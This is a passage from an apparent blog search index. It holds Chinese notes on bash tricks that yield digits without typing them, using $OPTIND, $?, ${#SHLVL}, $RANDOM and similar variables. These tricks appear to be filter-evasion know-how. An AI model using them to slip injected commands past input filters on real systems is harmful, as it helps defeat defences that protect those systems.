class="line">$_。表示上一个命令的返回结果。这样就可以构造任意数字</span><br><span class="line">echo $&#123;#A&#125;</span><br><span class="line">由于变量A没定义。所以他的长度为0.</span><br><span class="line">echo $OPTIND</span><br><span class="line">这个也可以获取数字1</span><br><span class="line">&gt;B;echo $?</span><br><span class="line">最后运行的命令的结束代码,可以获得数字0</span><br><span class="line">&lt;B;echo $?</span><br><span class="line">最后运行的命令的结束代码,可以获得数字1</span><br><span class="line">echo $RANDOM</span><br><span class="line">可以生成随机数。可以配合#构造6543这几种数字。概率比较大。还可以配合截取。获得数字</span><br><span class="line">echo $&#123;#$&#125;</span><br><span class="line">$$是程序PID。#获取长度。看运气咯</span><br><span class="line">echo $&#123;#SHLVL&#125;</span><br><span class="line">SHLVL貌似是一个shell终端深度。。然后#可以获取数字1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 智慧的收藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 奇技淫巧 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
